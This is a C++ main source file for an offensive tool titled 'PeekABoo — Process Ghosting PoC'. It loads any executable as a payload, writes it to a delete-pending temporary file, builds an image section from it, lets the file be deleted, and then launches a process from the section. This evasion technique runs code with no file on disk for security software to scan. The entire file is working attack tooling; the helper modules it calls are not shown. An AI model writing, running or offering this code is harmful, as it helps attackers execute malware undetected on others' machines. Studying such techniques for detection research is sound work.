#include "Common.hpp"
#include "ErrorHandler.hpp"
#include "PayloadManager.hpp"
#include "FileGhoster.hpp"
#include "SectionManager.hpp"
#include "ProcessExecutor.hpp"
#include <iostream>
#include <string>

static void PrintUsage(const char *argv0)
{
    std::cerr << "Usage: " << argv0 << " <payload.exe> [ghost_path]" << std::endl;
    std::cerr << "  payload.exe  Path to the PE file to ghost-execute." << std::endl;
    std::cerr << "  ghost_path   Temp path for the ghost file (default: C:\\Windows\\Temp\\ghost_payload.bin)" << std::endl;
}

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        PrintUsage(argv[0]);
        return 1;
    }

    std::string payloadPath = argv[1];
    std::wstring ghostFilePath = (argc >= 3)
        ? std::wstring(argv[2], argv[2] + strlen(argv[2]))
        : L"C:\\Windows\\Temp\\ghost_payload.bin";

    std::cout << "[*] PeekABoo — Process Ghosting PoC" << std::endl;
    std::cout << "[*] Payload : " << payloadPath << std::endl;

    // 1. Resolve Native APIs from ntdll.dll
    if (!DynamicNT::Instance().Initialize())
    {
        std::cerr << "[-] Failed to resolve NTAPI functions." << std::endl;
        return 1;
    }
    std::cout << "[+] NTAPI functions resolved." << std::endl;

    // 2. Load and validate payload
    std::vector<uint8_t> payload = PayloadManager::LoadPayload(payloadPath);
    if (payload.empty())
        return 1;

    if (!PayloadManager::ValidatePE(payload))
        return 1;

    uint32_t entryPoint = PayloadManager::GetEntryPoint(payload);
    if (!entryPoint)
    {
        std::cerr << "[-] Could not determine entry point." << std::endl;
        return 1;
    }
    std::cout << "[+] Payload validated. Entry point RVA: 0x" << std::hex << entryPoint << std::dec << std::endl;

    // 3. Create ghost file and write payload
    HANDLE hGhostFile = FileGhoster::CreateGhostFile(ghostFilePath);
    if (hGhostFile == INVALID_HANDLE_VALUE)
        return 1;

    if (!FileGhoster::WritePayloadToFile(hGhostFile, payload))
    {
        FileGhoster::CloseGhostFile(hGhostFile);
        return 1;
    }

    // 4. Create image section while the file handle is still open
    HANDLE hSection = SectionManager::CreateImageSection(hGhostFile);
    if (!hSection)
    {
        FileGhoster::CloseGhostFile(hGhostFile);
        return 1;
    }

    // 5. Close the file handle — triggers deletion, ghosting begins
    FileGhoster::CloseGhostFile(hGhostFile);

    // 6. Create process, write PEB parameters, create thread, and resume
    bool success = ProcessExecutor::Run(hSection, entryPoint, ghostFilePath);
    ErrorHandler::SafeCloseHandle(hSection);

    if (success)
        std::cout << "[+] Process Ghosting successful. Payload is running." << std::endl;
    else
        std::cerr << "[-] Payload execution failed." << std::endl;

    std::cout << "[*] Press Enter to exit..." << std::endl;
    std::cin.get();

    return success ? 0 : 1;
}
